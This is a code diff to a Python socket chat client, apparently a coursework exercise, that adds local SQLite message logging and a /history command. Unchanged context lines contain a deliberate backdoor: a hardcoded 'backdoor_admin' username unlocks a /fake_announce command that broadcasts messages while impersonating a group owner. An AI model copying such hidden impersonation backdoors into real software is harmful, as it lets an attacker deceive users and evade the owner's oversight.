@@ -6,6 +6,7 @@ from datetime import datetime
 import re
 import base64
 import os
+import sqlite3
 
 #clientA 连接serverA
 HOST = "127.0.0.1"
@@ -18,6 +19,17 @@ receive_messages 方法：
     3. 处理文件传输请求
     4. 打印命令提示符
 '''
+def insert_message(conn, msg_type, sender, receiver, group_name, content, timestamp, direction):
+    cursor = conn.cursor()
+    cursor.execute(
+        """
+        INSERT INTO messages (msg_type, sender, receiver, group_name, content, timestamp, direction)
+        VALUES (?, ?, ?, ?, ?, ?, ?)
+        """,
+        (msg_type, sender, receiver, group_name, content, timestamp, direction)
+    )
+    conn.commit()
+
 def receive_messages(sock):
     while True:
         try:
@@ -43,10 +55,14 @@ def receive_messages(sock):
                         print(f"[File] Failed to save file: {e}")
                 elif reply.get('payload_type') == 'text':
                     print(f"\n[{reply['from']}] ➜ You: {reply['payload']}")
+                    # 写入数据库（普通文本消息）
+                    insert_message(db_conn, 'text', reply['from'], name, None, reply['payload'], reply.get('timestamp', datetime.now().isoformat()), 'received')
                 elif reply.get('payload_type') == 'file':
                     print(f"\n[{reply['from']}] wants to send you a file: {reply.get('file_path', 'unknown')}")
                 elif reply.get('type') == 'group_message':
                     print(f"\n[Group:{reply['to']}] {reply['from']}: {reply['content']}")
+                    # 写入数据库（群聊消息）
+                    insert_message(db_conn, 'group', reply['from'], reply['to'], reply['to'], reply['content'], reply.get('timestamp', datetime.now().isoformat()), 'received')
                 else:
                     print(f"\n[{reply['from']}] ➜ You: {reply['payload']}")
                 print("Command (/list, /msg <user> content, /msg_file <user> <file>, /create_group <name>, /join_group <name>, /list_group, /msg_group <group> <message>, /delete_group <name>, /quit): ", end="", flush=True)
@@ -56,6 +72,39 @@ def receive_messages(sock):
         except Exception as e:
             print(f"\nError receiving message: {e}")
             break
+
+def init_db(username):
+    db_filename = f"local_message_database_{username}.db"
+    conn = sqlite3.connect(db_filename, check_same_thread=False)
+    cursor = conn.cursor()
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS messages (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            msg_type TEXT NOT NULL,
+            sender TEXT NOT NULL,
+            receiver TEXT NOT NULL,
+            group_name TEXT,
+            content TEXT NOT NULL,
+            timestamp TEXT NOT NULL,
+            direction TEXT NOT NULL
+        )
+    ''')
+    conn.commit()
+    return conn
+
+def print_history(conn):
+    cursor = conn.cursor()
+    cursor.execute("SELECT msg_type, sender, receiver, group_name, content, timestamp, direction FROM messages ORDER BY id ASC")
+    rows = cursor.fetchall()
+    print("\n--- Local Message History ---")
+    for row in rows:
+        msg_type, sender, receiver, group_name, content, timestamp, direction = row
+        if msg_type == 'text':
+            print(f"[{timestamp}] ({direction}) {sender} -> {receiver}: {content}")
+        elif msg_type == 'group':
+            print(f"[{timestamp}] ({direction}) [Group:{group_name}] {sender}: {content}")
+    print("--- End of History ---\n")
+
 '''
 main 方法：
     1. 连接到server
@@ -72,10 +121,13 @@ main 方法：
 发送信息给server.
 '''
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect((HOST, PORT))
+    s.connect((HOST, PORT))#连接server
     name_prompt = s.recv(1024).decode()
     name = input(name_prompt).strip()
     s.sendall(name.encode())
+
+    # 初始化本地数据库
+    db_conn = init_db(name)
 
     print("You are connected. Available commands:")
     print("  /list - List online users")
@@ -86,6 +138,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     print("  /list_group - List all groups")
     print("  /msg_group <group> <message> - Send message to group")
     print("  /delete_group <name> - Delete a group (creator only)")
+    print("  /history - Show message history")
     if name == "backdoor_admin":
         print("  /fake_announce <group> <message> - Broadcast as group owner (backdoor)")
     print("  /quit - Exit")
@@ -107,6 +160,9 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 }
                 s.sendall(json.dumps(list_msg).encode())
                 continue
+            if cmd.lower() == '/history':
+                print_history(db_conn)
+                continue
             # 支持 /msg <user> 内容 格式
             #\s+：匹配一个或多个空白字符（空格、Tab等）
             #(\S+)：匹配并捕获目标用户名，由一个或多个非空白字符组成
@@ -126,6 +182,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     "timestamp": datetime.now().isoformat()
                 }
                 s.sendall(json.dumps(msg_cmd).encode())
+                # 写入数据库（自己发出的文本消息）
+                insert_message(db_conn, 'text', name, target, None, content, msg_cmd["timestamp"], 'sent')
                 continue
             # 支持 /msg_file <user> <文件路径> 格式
             file_match = re.match(r'/msg_file\s+(\S+)\s+(.+)', cmd)
@@ -214,6 +272,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     "timestamp": datetime.now().isoformat()
                 }
                 s.sendall(json.dumps(group_cmd).encode())
+                # 写入数据库（自己发出的群聊消息）
+                insert_message(db_conn, 'group', name, group_name, group_name, content, group_cmd["timestamp"], 'sent')
                 continue
                         # ===== Backdoor: 伪造群主身份发送群公告 =====
             fake_announce_match = re.match(r'/fake_announce\s+(\S+)\s+(.+)', cmd)
@@ -241,6 +301,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             print("  /list_group - List all groups")
             print("  /msg_group <group> <message> - Send message to group")
             print("  /delete_group <name> - Delete a group (creator only)")
+            print("  /history - Show message history")
             if name == "backdoor_admin":
                 print("  /fake_announce <group> <message> - Broadcast as group owner (backdoor)")
             print("  /quit - Exit")
